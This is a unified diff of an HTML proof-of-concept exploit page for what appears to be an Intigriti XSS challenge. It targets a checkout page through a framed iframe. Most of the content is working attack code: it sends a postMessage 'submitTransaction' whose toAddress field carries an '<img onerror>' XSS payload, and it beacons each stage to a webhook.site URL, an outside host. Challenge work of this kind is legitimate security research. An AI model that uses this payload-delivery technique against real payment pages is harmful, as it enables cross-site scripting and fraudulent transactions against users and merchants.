@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html><head><title>Payment Target</title></head>
+<html><head><title>Address XSS</title></head>
 <body>
 <h2>Loading...</h2>
 <script>
-const WEBHOOK = 'https://webhook.site/a6d10da6-d560-4f74-a1a8-287a9b0d3886';
+const WEBHOOK = 'https://webhook.site/53fbb230-340b-4eba-8cf3-27641c0a00a6';
 const WALLET = '16472226db03703a192aa383237035a69f';
 
 fetch(WEBHOOK + '?s=1_START').catch(()=>{});
@@ -14,56 +14,28 @@ if (blank) {
     blank.document.write(`
         <!DOCTYPE html>
         <body>
-        <h3>Step 1: Loading checkout...</h3>
-        <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
-        <div id=log></div>
+        <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
         <script>
             const WEBHOOK = '${WEBHOOK}';
             const WALLET = '${WALLET}';
             
-            function log(msg) {
-                document.getElementById('log').innerHTML += '<br>' + msg;
-                fetch(WEBHOOK + '?s=' + msg).catch(()=>{});
-            }
-            
-            log('2_PAGE_READY');
-            
-            document.getElementById('checkout').onload = function() {
-                log('3_CHECKOUT_LOADED');
+            document.getElementById('x').onload = function() {
+                fetch(WEBHOOK + '?s=2_LOADED').catch(()=>{});
                 
-                // First, try to send the init message like a real payment gateway would
                 setTimeout(function() {
-                    try {
-                        const checkoutWin = document.getElementById('checkout').contentWindow;
-                        
-                        // Send init message (simulating payment gateway)
-                        checkoutWin.postMessage({
-                            type: 'init',
+                    // Send with XSS in address field (like the successful exploit)
+                    const iframe = document.getElementById('x');
+                    iframe.contentWindow.postMessage({
+                        type: 'submitTransaction',
+                        transaction: {
+                            toAddress: '<img src=x onerror="alert(\\'gigawatz\\')">',
                             currency: '1337COIN',
-                            amount: 1,
-                            price: 1
-                        }, 'https://challenge-0126.intigriti.io');
-                        
-                        log('4_INIT_SENT');
-                        
-                        // Then send the transaction
-                        setTimeout(function() {
-                            checkoutWin.postMessage({
-                                type: 'submitTransaction',
-                                transaction: {
-                                    toAddress: WALLET,
-                                    currency: '1337COIN',
-                                    amount: 1,
-                                    nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
-                                }
-                            }, 'https://challenge-0126.intigriti.io');
-                            
-                            log('5_TRANSACTION_SENT');
-                        }, 1000);
-                        
-                    } catch(e) {
-                        log('4_ERROR_' + e.message);
-                    }
+                            amount: 0,
+                            nickname: 'xss-payload'
+                        }
+                    }, '*');
+                    
+                    fetch(WEBHOOK + '?s=3_SENT').catch(()=>{});
                 }, 2000);
             };
         <\/script>
